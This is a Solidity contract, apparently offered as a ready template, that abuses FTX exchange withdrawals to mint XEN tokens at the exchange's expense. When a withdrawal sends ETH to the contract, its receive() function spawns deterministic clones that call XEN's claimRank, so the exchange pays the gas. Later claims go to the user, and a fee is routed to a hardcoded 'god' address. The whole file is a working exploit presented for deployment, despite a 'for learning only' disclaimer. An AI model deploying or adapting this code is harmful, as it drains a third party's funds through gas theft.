// SPDX-License-Identifier: AGPL
/**
 * @author @BoxMrChen https://twitter.com/BoxMrChen
 * @author @SafeHouseDAO
 * @dev FTX提现Mint XEN模版，希望各位大佬遵守一下开源协议，不要拿着别人的成果不留名字修改商用。
 * @dev 本合约仅供学习交流使用，不保证安全性，使用本合约造成的损失由使用者自行承担。
 * @dev 本合约捐赠费用为抽成10%，你可以选择自己部署或者修改，但是禁止商用。
 *
 * ██╗    ██╗███████╗██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗
 * ██║    ██║██╔════╝██╔══██╗╚════██╗██╔══██╗██╔═══██╗╚██╗██╔╝
 * ██║ █╗ ██║█████╗  ██████╔╝ █████╔╝██████╔╝██║   ██║ ╚███╔╝
 * ██║███╗██║██╔══╝  ██╔══██╗ ╚═══██╗██╔══██╗██║   ██║ ██╔██╗
 * ╚███╔███╔╝███████╗██████╔╝██████╔╝██████╔╝╚██████╔╝██╔╝ ██╗
 *  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 */
pragma solidity ^0.8.13;

import {Owned} from "./Owned.sol";
import {Clones} from "./Clones.sol";
import {IXen} from "./IXen.sol";

contract XenFTXWitch is Owned {
    address public immutable XenFTXWitchOrigin;
    address public constant god = 0xc3B90066D445a2F816055008b36dB7E499999999;
    address public immutable XEN;
    bytes public XENInitData;

    // factory proxy;
    uint public term;
    uint public createCount;

    event CreateFactory(address indexed factory, address indexed owner);
    event CreateMiniClone(address indexed clone1, address indexed clone2);

    constructor(address xen_) Owned(god) {
        XEN = xen_;
        XenFTXWitchOrigin = address(this);
        XENInitData = bytes.concat(bytes20(0x3D602d80600A3D3981F3363d3d373d3D3D363d73), bytes20(address(this)), bytes15(0x5af43d82803e903d91602b57fd5bf3));
    }

    function withdraw() external {
        payable(god).transfer(address(this).balance);
    }

    function createFactory(uint term_) external {
        bytes memory bytecode = XENInitData;
        address addr;
        assembly {
            addr := create(0, add(bytecode, 32), mload(bytecode))
        }
        require(addr != address(0), "XenFTXWitch: create failed");
        XenFTXWitch cloneWitch = XenFTXWitch(payable(addr));
        cloneWitch.init(msg.sender);
        cloneWitch.setTerm(term_);
        emit CreateFactory(address(cloneWitch), msg.sender);
    }

    //====== clone factory function ======//
    function init(address owner_) external {
        require(owner == address(0x0), "En?NiXiaoZi!"); //嗯?你小子!
        owner = owner_;
    }

    function setTerm(uint term_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        term = term_;
    }

    receive() external payable {
        address thisAddress = address(this);
        uint termM = term;
        uint createCountM = createCount;
        require(thisAddress != XenFTXWitchOrigin, "KeKe,ZaShier"); //咳咳，咋事儿?
        address instance = Clones.cloneDeterministic(XenFTXWitchOrigin,keccak256(abi.encodePacked(owner, createCountM)));
        XenFTXWitch(payable(instance)).initSubOwner(thisAddress,termM);
        createCount = createCountM + 1;
    }

    function claimAll(uint32[] calldata ids) public {
        uint l = ids.length;
        while(l > 0){
            l--;
            XenFTXWitch(
                payable(Clones.predictDeterministicAddress(XenFTXWitchOrigin,keccak256(abi.encodePacked(msg.sender, uint(ids[l])))))
            ).claim();
        }
    }

    ///==== sub proxy function ====///

    function initSubOwner(
        address owner_,
        uint term_
    ) public {
        require(owner == address(0x0), "W?");
        owner = owner_;
        IXen(XEN).claimRank(term_);
    }

    function claim() public {
        require(owner == msg.sender, "UNAUTHORIZED CLAIM");
        IXen(XEN).claimMintRewardAndShare(god, 0);
        IXen(XEN).transfer(tx.origin, IXen(XEN).balanceOf(address(this)));
    }
}